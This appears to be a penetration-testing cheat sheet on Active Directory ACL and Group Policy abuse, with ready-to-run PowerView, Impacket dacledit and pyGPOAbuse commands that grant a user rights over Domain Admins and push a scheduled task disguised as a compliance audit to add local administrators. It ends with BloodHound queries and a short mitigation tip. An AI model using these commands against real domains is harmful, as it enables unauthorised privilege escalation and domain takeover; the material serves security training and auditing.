# 🔐 ACL Abuse & Group Policy (GPO) Exploitation

Active Directory permissions are governed by Access Control Entries (ACEs) inside Discretionary Access Control Lists (DACLs). Misconfigured ACL permissions allow low-privileged domain accounts to escalate privileges and alter domain-wide security policies.

---

### High-Risk Active Directory Permissions

| Permission | Abuse Potential | Exploitation Action |
| :--- | :--- | :--- |
| **`GenericAll`** | Full control over target object. | Reset target password, add users to target group, modify service SPNs. |
| **`WriteDacl`** | Ability to modify object permissions. | Add `GenericAll` rights for attacker account onto target object. |
| **`WriteOwner`** | Ability to take ownership of object. | Grant self ownership, then grant self `WriteDacl` / `GenericAll`. |
| **`GenericWrite`** | Ability to modify object attributes. | Overwrite `scriptPath`, `userParameters`, or modify group membership. |
| **`ForceChangePassword`** | Reset user password without knowing existing password. | Immediately takeover service or administrative user account. |
| **`AddMember`** | Add any user or computer to target group. | Add compromised user directly to `Domain Admins` or `Account Operators`. |

---

### Exploiting `WriteDacl` via PowerView & Impacket

If BloodHound reveals your user has `WriteDacl` over a target privileged group:

```powershell
# Using PowerView from Windows PowerShell
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "jdoe" -Rights All

# Verify that jdoe now has GenericAll over Domain Admins
Get-DomainObjectAcl -Identity "Domain Admins" ? {$_.SecurityIdentifier -eq (Convert-NameToSid "jdoe")}

# Add user directly to Domain Admins
net group "Domain Admins" jdoe /add /domain
```

#### Linux-Native Remote DACL Modification with `dacledit.py`

```bash
# Add full control rights using Impacket's dacledit
dacledit.py -action 'write' -rights 'FullControl' -principal 'jdoe' \
  -target 'Domain Admins' CORP.LOCAL/jdoe:'Welcome2025!' -dc-ip 192.168.56.10
```

---

### Group Policy Object (GPO) Abuse

#### Theoretical Vulnerability
Group Policy Objects (GPOs) configure security settings, user rights, and scheduled tasks across workstations and servers within an Organizational Unit (OU). 

If a low-privileged account possesses `GenericAll` or `WriteProperty` permissions on a GPO, it can inject a malicious scheduled task or local administrator directive that executes automatically across all endpoints linked to that GPO within 90 minutes (the default GPO refresh interval).

```bash
# Inject immediate scheduled task into target GPO using pyGPOAbuse
pyGPOAbuse.py -gpo-id "B19E4A10-4A9B-4089-8083-6AE650C1B03B" \
  -user 'jdoe' -password 'Welcome2025!' -domain 'corp.local' -dc-ip 192.168.56.10 \
  -command "net localgroup Administrators jdoe /add" \
  -taskname "SecurityComplianceAudit"

# Force immediate policy refresh on target endpoint (for testing)
gpupdate /force
```

---

### Auditing & BloodHound Threat Hunting Queries

```cypher
// Find all users with GenericAll or WriteDacl over privileged groups
MATCH p=(u:User)-[r:GenericAll|WriteDacl|WriteOwner]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
RETURN p

// Find shortest path to Domain Admins through ACL relationships
MATCH p=shortestPath((u:User {name: "JDOE@CORP.LOCAL"})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p
```

> [!TIP]
> **Blue Team Mitigation**:
> * Enforce the principle of least privilege on Active Directory delegation.
> * Audit GPO permissions regularly: ensure only `Domain Admins` and authorized delegated accounts have write access to Group Policy container objects in `CN=Policies,CN=System,DC=corp,DC=local`.
